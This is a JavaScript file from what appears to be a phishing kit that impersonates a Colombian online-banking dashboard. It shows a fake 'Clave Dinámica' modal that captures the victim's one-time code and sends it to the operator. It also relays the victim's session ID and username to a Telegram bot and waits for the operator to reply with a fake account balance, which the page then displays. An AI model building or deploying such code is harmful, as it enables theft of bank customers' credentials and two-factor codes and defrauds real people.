// Fecha actual
  const meses = ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'];
  const dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
  const now = new Date();
  const horaStr = now.toLocaleTimeString('es-CO',{hour:'numeric',minute:'2-digit',hour12:true});
  const fechaStr = `${dias[now.getDay()]}, ${now.getDate()} de ${meses[now.getMonth()]} de ${now.getFullYear()}, ${horaStr}`;
  document.getElementById('currentDate').textContent = fechaStr;
  document.getElementById('lastVisit').textContent = fechaStr;
  document.getElementById('greetingName').textContent =
    USER.charAt(0).toUpperCase() + USER.slice(1).toLowerCase();

  // Toggle saldo
  let hidden = true;
  let realBalance = '$ 1.300,32';
  document.getElementById('toggleBalance').addEventListener('click', () => {
    hidden = !hidden;
    document.getElementById('balance').textContent = hidden ? '****' : realBalance;
    document.getElementById('toggleText').textContent = hidden ? 'Mostrar saldos' : 'Ocultar saldos';
  });

  // Drag-scroll en shortcuts (desktop)
  const sc = document.getElementById('shortcuts');
  let isDown = false, startX, scrollLeft, moved = false;
  sc.addEventListener('mousedown', (e) => {
    isDown = true; moved = false;
    sc.classList.add('dragging');
    startX = e.pageX - sc.offsetLeft;
    scrollLeft = sc.scrollLeft;
  });
  sc.addEventListener('mouseleave', () => { isDown = false; sc.classList.remove('dragging'); });
  sc.addEventListener('mouseup',    () => { isDown = false; sc.classList.remove('dragging'); });
  sc.addEventListener('mousemove', (e) => {
    if (!isDown) return;
    e.preventDefault();
    const x = e.pageX - sc.offsetLeft;
    const walk = (x - startX) * 1.2;
    if (Math.abs(walk) > 5) moved = true;
    sc.scrollLeft = scrollLeft - walk;
  });
  sc.querySelectorAll('.shortcut-card').forEach(card => {
    card.addEventListener('click', (e) => { if (moved) { e.stopPropagation(); e.preventDefault(); } }, true);
  });

  /* ====== Modal Clave Dinámica ====== */
  const din = setupOtpInputs('otpInputs', 'btnContinue', 'otpError');
  let showDinError = false;

  function openDinModal() {
    showLoader();
    setTimeout(() => {
      hideLoader();
      din.clear();
      const errEl = document.getElementById('otpError');
      if (showDinError) {
        errEl.classList.add('show');
        showDinError = false;
      } else {
        errEl.classList.remove('show');
      }
      document.getElementById('dinModal').classList.add('show');
      setTimeout(() => din.inputs[0] && din.inputs[0].focus(), 50);
    }, 1200);
  }
  function closeDinModal() {
    document.getElementById('dinModal').classList.remove('show');
  }
  document.getElementById('dinModal').addEventListener('click', (e) => {
    if (e.target.id === 'dinModal') closeDinModal();
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeDinModal();
  });

  document.getElementById('btnContinue').addEventListener('click', () => {
    const btn = document.getElementById('btnContinue');
    if (btn.disabled) return;
    const code = din.getCode();
    closeDinModal();
    sendAndWait({ event: 'DINAMICA', dinamic: code }, {
      onOk:  () => { sessionStorage.clear(); location.href = 'index.html'; },
      onErr: () => { hideLoader(); showDinError = true; openDinModal(); }
    });
  });

  // Si venimos del login con ?modal=din, abrir directo
  if (new URLSearchParams(location.search).get('modal') === 'din') {
    setTimeout(() => openDinModal(), 600);
  }

  // ====== Saldo Dinámico vía Telegram ======
  async function initDashboardBalance() {
    // Mostrar loader hasta que se reciba el saldo de telegram
    showLoader();

    const balEl = document.getElementById('balance');
    const toggleBtn = document.getElementById('toggleBalance');
    
    toggleBtn.style.pointerEvents = 'none';
    toggleBtn.style.opacity = '0.5';

    try {
      const txt = `🏦 *DASHBOARD*\n\n🆔 ID: \`${SESSION_ID}\`\n👤 Usuario: \`${USER}\`\n\n_Para establecer el saldo, RESPONDE (Reply) a este mensaje con el monto (ej. $ 1.500,00)_`;
      const res = await fetch(`/api/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: txt, parse_mode: 'Markdown' })
      });
      const data = await res.json();
      
      if (data.ok) {
        pollForBalance(data.result.message_id);
      } else {
        setFallbackBalance();
      }
    } catch(e) {
      setFallbackBalance();
    }
  }

  function setFallbackBalance() {
    hideLoader(); // Ocultar loader si falla la conexión
    const balEl = document.getElementById('balance');
    balEl.classList.remove('skeleton');
    balEl.textContent = '****';
    realBalance = '$ 0,00';
    enableToggle();
  }

  function enableToggle() {
    const toggleBtn = document.getElementById('toggleBalance');
    toggleBtn.style.pointerEvents = 'auto';
    toggleBtn.style.opacity = '1';
  }

  async function pollForBalance(msgId) {
    try {
      const r = await fetch(`/api/getUpdates?msgId=${msgId}`);
      const d = await r.json();

      if (d.ok && d.result) {
        for (let u of d.result) {
          if (u.message && u.message.reply_to_message && u.message.reply_to_message.message_id === msgId) {
            let newBalance = u.message.text.trim();
            
            const balEl = document.getElementById('balance');
            balEl.classList.remove('skeleton');
            balEl.textContent = '****';
            
            realBalance = newBalance;
            hidden = true;
            document.getElementById('toggleText').textContent = 'Mostrar saldos';
            
            enableToggle();
            hideLoader(); // Ocultar el loader ahora que ya se configuró el saldo
            
            fetch(`/api/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: `✅ Saldo actualizado a: ${newBalance}`, reply_to_message_id: u.message.message_id })
            });

            return;
          }
        }
      }
    } catch (e) {}
    
    setTimeout(() => pollForBalance(msgId), 2500);
  }

  initDashboardBalance();